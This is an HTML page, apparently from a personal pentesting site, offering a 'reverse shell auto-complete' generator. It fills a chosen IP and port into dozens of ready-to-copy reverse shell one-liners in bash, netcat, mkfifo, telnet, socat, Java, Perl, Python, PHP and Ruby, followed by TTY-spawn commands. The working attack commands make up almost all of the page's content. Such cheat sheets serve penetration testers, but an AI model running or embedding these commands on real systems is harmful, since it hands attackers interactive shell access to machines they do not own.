@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-149344965-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-149344965-1');
+</script>
+
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="google-site-verification" content="x8Iv_Db6KOOx4mL-b2Ink56M14U_RsqmDiyYHZU8nR8" />
+        <title>Reverse shell auto-complete</title>
+        
+        <style>
+
+    html body {
+        font-family: 'Oxygen', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: red;
+        --border-width:  0 ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://masterccc.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Oxygen">
+
+
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"> 
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/sh.min.js"></script> 
+
+    <script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.58.3" />
+        
+
+        
+    </head>
+
+    
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+    
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Reverse shell auto-complete</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/reverse/">Reverse</a></li>
+                            
+                                <li><a href="/realist/">Realist</a></li>
+                            
+                                <li><a href="/memo/">Memo</a></li>
+                            
+                                <li><a href="/tools/">Tools</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/masterccc/"><i class="fa fa-github"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <div>
+        <a class="itemtitle" href="/tools/reverseshell/">Reverse shell auto-complete</a>
+        <span class="itemdate">October 5, 2019</span>
+    </div>
+
+
+    
+
+</div>
+
+
+    <br> <div class="text-justify"><style>
+.pre-wrapper{
+   position:relative;
+}
+.pre-wrapper pre{
+   padding-top: 25px;
+}
+.pre-wrapper .copy-snippet {
+   border-radius: 0;
+   min-width:55px;
+   background: none repeat scroll 0 0 transparent;
+   border: 1px solid #bbb;
+   color: #26589F;
+   font-family: 'HELEVETICA',sans-serif;
+   font-size: 12px;
+   font-weight: normal;
+   line-height: 1.42rem;
+   margin: 0;
+   padding: 0px 5px;
+   text-align: center;
+   text-decoration: none;
+   text-indent: 0;
+   position:absolute;
+   background:#ccc;
+   top:0;
+   left:0;
+}
+.pre-wrapper .copy-snippet:disabled{
+   color:#555;
+}</style>
+
+<h2>Reverse shell auto-complete</h2>
+<br>
+
+Auditor IP : <input id="txt_ip" type="text" name="ip" value="192.168.0.50"/>
+Auditor Port : <input id="txt_port" type="text" name="port" value="5555"/>
+
+<button id="btn_generate"/>Generate</button>
+<br><br>
+
+<h3>Bash</h3>
+
+<pre>
+bash -i &#x3E;&#x26; /dev/tcp/<span class="ipc"></span>/<span class="portf"></span> 0&#x3E;&#x26;1
+</pre>
+
+<pre>
+exec 5&#x3C;&#x3E;/dev/tcp/<span class="ipc"></span>/<span class="portf"></span>;cat &#x3C;&#x26;5 | while read line; do $line 2&#x3E;&#x26;5 &#x3E;&#x26;5; done
+</pre>
+
+<pre>
+exec /bin/sh 0&#x3C;/dev/tcp/<span class="ipc"></span>/<span class="portf"></span> 1&#x3E;&#x26;0 2&#x3E;&#x26;0
+</pre>
+<h3>Netcat</h3>
+<pre>
+nc <span class="ipc"></span> <span class="portf"></span> -e /bin/bash
+</pre>
+
+ <pre>
+/bin/nc.traditional <span class="ipc"></span> <span class="portf"></span> -e /bin/bash
+</pre>
+
+ <pre>
+/bin/nc.traditional <span class="ipc"></span> <span class="portf"></span> -c /bin/bash
+</pre>
+
+<h3>mkfifo</h3>
+
+<pre>
+rm f;mkfifo f;cat f|/bin/sh -i 2&#x3E;&#x26;1|nc <span class="ipc"></span> <span class="portf"></span> &#x3E; f
+</pre>
+
+ <pre>
+rm f;mkfifo f;cat f|/bin/sh -i 2&#x3E;&#x26;1|/bin/nc.openbsd <span class="ipc"></span> <span class="portf"></span> &#x3E; f
+</pre>
+
+<h3>mknod</h3>
+
+<pre>
+rm -f x; mknod x p &#x26;&#x26; nc <span class="ipc"></span> <span class="portf"></span> 0&#x3C;x | /bin/bash 1&#x3E;x
+</pre>
+
+ <pre>
+rm -f x; mknod x p &#x26;&#x26; /bin/nc.openbsd <span class="ipc"></span> <span class="portf"></span> 0&#x3C;x | /bin/bash 1&#x3E;x
+</pre>
+
+<h3>telnet</h3>
+
+<pre>
+telnet <span class="ipc"></span> &#x3C;PORT1&#x3E; | /bin/bash | telnet <span class="ipc"></span> &#x3C;PORT2&#x3E;
+</pre>
+
+<pre>
+rm f;mkfifo f;cat f|/bin/sh -i 2&#x3E;&#x26;1|telnet <span class="ipc"></span> <span class="portf"></span> &#x3E; f
+</pre>
+
+<pre>
+rm -f x; mknod x p &#x26;&#x26; telnet <span class="ipc"></span> <span class="portf"></span> 0&#x3C;x | /bin/bash 1&#x3E;x
+</pre>
+
+<h3>Socat</h3>
+<pre>
+socat tcp-connect:<span class="ipc"></span>:<span class="portf"></span> exec:&#x22;bash -li&#x22;,pty,stderr,setsid,sigint,sane
+</pre>
+
+<h3>Java</h3>
+
+<pre>
+r = Runtime.getRuntime()
+p = r.exec([&#x22;/bin/bash&#x22;,&#x22;-c&#x22;,&#x22;exec 5&#x3C;&#x3E;/dev/tcp/<span class="ipc"></span>/<span class="portf"></span>;cat &#x3C;&#x26;5 | while read line; do \$line 2&#x3E;&#x26;5 &#x3E;&#x26;5; done&#x22;] as String[])
+p.waitFor()
+</pre>
+
+<h3>Perl</h3>
+<pre>
+perl -e &#x27;use Socket;$i=&#x22;<span class="ipc"></span>&#x22;;$p=<span class="portf"></span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#x22;tcp&#x22;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#x22;&#x3E;&#x26;S&#x22;);open(STDOUT,&#x22;&#x3E;&#x26;S&#x22;);open(STDERR,&#x22;&#x3E;&#x26;S&#x22;);exec(&#x22;/bin/sh -i&#x22;);};&#x27;
+</pre>
+<h3>Python</h3>
+
+<pre>
+__import__("subprocess").getoutput("Your_bash_reverse_shell_here")
+</pre>
+
+<pre>
+python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x22;<span class="ipc"></span>&#x22;,<span class="portf"></span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#x22;/bin/sh&#x22;,&#x22;-i&#x22;]);&#x27;
+</pre>
+
+
+<h3>PHP</h3>
+<pre>
+php -r &#x27;$s=fsockopen(&#x22;<span class="ipc"></span>&#x22;,<span class="portf"></span>);exec(&#x22;/bin/sh -i &#x3C;&#x26;3 &#x3E;&#x26;3 2&#x3E;&#x26;3&#x22;);&#x27;
+</pre>
+
+ <pre>
+php -r &#x27;$s=fsockopen(&#x22;<span class="ipc"></span>&#x22;,<span class="portf"></span>);shell_exec(&#x22;/bin/sh -i &#x3C;&#x26;3 &#x3E;&#x26;3 2&#x3E;&#x26;3&#x22;);&#x27;
+</pre>
+
+ <pre>
+php -r &#x27;$s=fsockopen(&#x22;<span class="ipc"></span>&#x22;,<span class="portf"></span>);&#x60;/bin/sh -i &#x3C;&#x26;3 &#x3E;&#x26;3 2&#x3E;&#x26;3&#x60;;&#x27;
+</pre>
+
+ <pre>
+php -r &#x27;$s=fsockopen(&#x22;<span class="ipc"></span>&#x22;,<span class="portf"></span>);system(&#x22;/bin/sh -i &#x3C;&#x26;3 &#x3E;&#x26;3 2&#x3E;&#x26;3&#x22;);&#x27;
+</pre>
+
+ <pre>
+php -r &#x27;$s=fsockopen(&#x22;<span class="ipc"></span>&#x22;,<span class="portf"></span>);popen(&#x22;/bin/sh -i &#x3C;&#x26;3 &#x3E;&#x26;3 2&#x3E;&#x26;3&#x22;, &#x22;r&#x22;);&#x27;
+</pre>
+
+<h3>Ruby</h3>
+<pre>
+ruby -rsocket -e&#x27;f=TCPSocket.open(&#x22;<span class="ipc"></span>&#x22;,<span class="portf"></span>).to_i;exec sprintf(&#x22;/bin/sh -i &#x3C;&#x26;%d &#x3E;&#x26;%d 2&#x3E;&#x26;%d&#x22;,f,f,f)&#x27;
+</pre>
+
+<pre>
+ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&#x22;<span class="ipc"></span>&#x22;,&#x22;<span class="portf"></span>&#x22;);while(cmd=c.gets);IO.popen(cmd,&#x22;r&#x22;){|io|c.print io.read}end&#x27;
+</pre>
+
+<h3>Spawn a TTY</h3>
+<pre>
+/bin/sh -i
+python -c 'import pty; pty.spawn("/bin/sh")'
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+</pre>
+
+<h3>
+   Other sources :
+</h3>
+<a href="https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/">https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/</a><br>
+<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+</a><br>
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a>
+
+
+
+<script>
+ 
+   document.getElementById("btn_generate").onclick = function(){
+   
+      var ip = document.getElementById("txt_ip").value ;
+      var port = document.getElementById("txt_port").value ;
+      
+      ips = document.getElementsByClassName("ipc");
+      for(i=0;i<ips.length;i++) ips[i].innerHTML=ip;
+      
+      ports = document.getElementsByClassName("portf");
+      for(i=0;i<ports.length;i++) ports[i].innerHTML=port;
+
+   };
+
+   document.getElementById("btn_generate").click();
+
+jQuery( document).ready(function($){
+   var copyid = 0;
+   $('pre').each(function(){
+      copyid++;
+      $(this).attr( 'data-copyid', copyid).wrap( '<div class="pre-wrapper"/>');
+      $(this).parent().css( 'margin', $(this).css( 'margin') );
+      $('<button class="copy-snippet">Copy</button>').insertAfter( $(this) ).data( 'copytarget',copyid );
+   });
+
+   $('body').on( 'click', '.copy-snippet', function(ev){
+      ev.preventDefault();
+
+      var $copyButton = $(this);
+
+      $pre = $(document).find('pre[data-copyid=' + $copyButton.data('copytarget' ) + ']');
+      if ( $pre.length ) {
+         var textArea = document.createElement("textarea");
+
+         // Place in top-left corner of screen regardless of scroll position.
+         textArea.style.position = 'fixed';
+         textArea.style.top = 0;
+         textArea.style.left = 0;
+
+         // Ensure it has a small width and height. Setting to 1px / 1em
+         // doesn't work as this gives a negative w/h on some browsers.
+         textArea.style.width = '2em';
+         textArea.style.height = '2em';
+         
+         // We don't need padding, reducing the size if it does flash render.
+         textArea.style.padding = 0;
+
+         // Clean up any borders.
+         textArea.style.border = 'none';
+         textArea.style.outline = 'none';
+         textArea.style.boxShadow = 'none';
+
+         // Avoid flash of white box if rendered for any reason.
+         textArea.style.background = 'transparent';
+
+         //Set value to text to be copied
+         textArea.value = $pre.html();
+
+         document.body.appendChild(textArea);
+         textArea.select();
+
+         try {
+            document.execCommand('copy');
+            $copyButton.text( 'Copied').prop('disabled', true);;
+         } catch (err) {
+            $copyButton.text( 'FAILED: Could not copy').prop('disabled', true);;
+         }
+         setTimeout(function(){
+            $copyButton.text( 'Copy').prop('disabled', false);;
+         }, 1000);
+      }
+   });
+});
+
+
+</script>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
